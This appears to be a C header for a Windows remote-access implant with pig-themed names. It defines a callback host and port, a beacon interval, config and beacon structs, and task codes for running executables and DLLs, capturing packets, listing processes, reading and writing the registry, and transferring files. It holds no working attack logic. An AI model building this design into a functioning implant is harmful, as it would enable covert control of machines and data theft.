#ifndef smallstuff_h
#define smallstuff_h

#include <Windows.h>

/*
 * A good place to put structs, constants, functions, etc...
 */

#define HAMPOST_IP "10.0.0.10"
#define HAMPOST_PORT 9999
#define CALL_DELAY 10000
#define PIG_PIN 0xa0b0c0d0
#define BUFF_SIZE 512


//============ the pigconfig ==================//
/* This will be the "config" for the porker and will be
populated by a query of the groundhog. 

*/

struct pigconfig {
	unsigned int porker_id;		//same as the PIG_PIN
	unsigned int oinkInterval;	//callback time cycle in milliseconds
	unsigned int timedConnect;	//next scheduled connection (future function)
	PCSTR hampost;				//ip of hampost
	unsigned int hamport;		//port of hampost
	unsigned int piglevel;		//run level (checks to see if installed)
	unsigned int exfilStatus;	//null (placeholder for future functionality) data stored in registry
};

//============ oink codes ================//

#define OC_QUERY	100
#define OC_ACK		200
#define OC_DATA		300
#define OC_CONT		400

//========================================//

struct oink {
	unsigned int PIG_ID;
	unsigned int oinkCode;
};


//============== task id's ===================//

#define TID_NONE		0
#define TID_EXE			1
#define TID_DLL			2
#define TID_PCAP		3
#define TID_PLIST		4
#define TID_REGGET		5
#define TID_REGPUT		6
#define TID_FILEGET		7
#define TID_FILEPUT		8

//Tasks with _PL will need to recv additional data from socket




//============================================//

struct task {
	unsigned int taskID;
	unsigned int taskSize;
	wchar_t taskName[MAX_PATH];
};

struct pigletTask {
	task TSK;
	char *BFFR;
};


#endif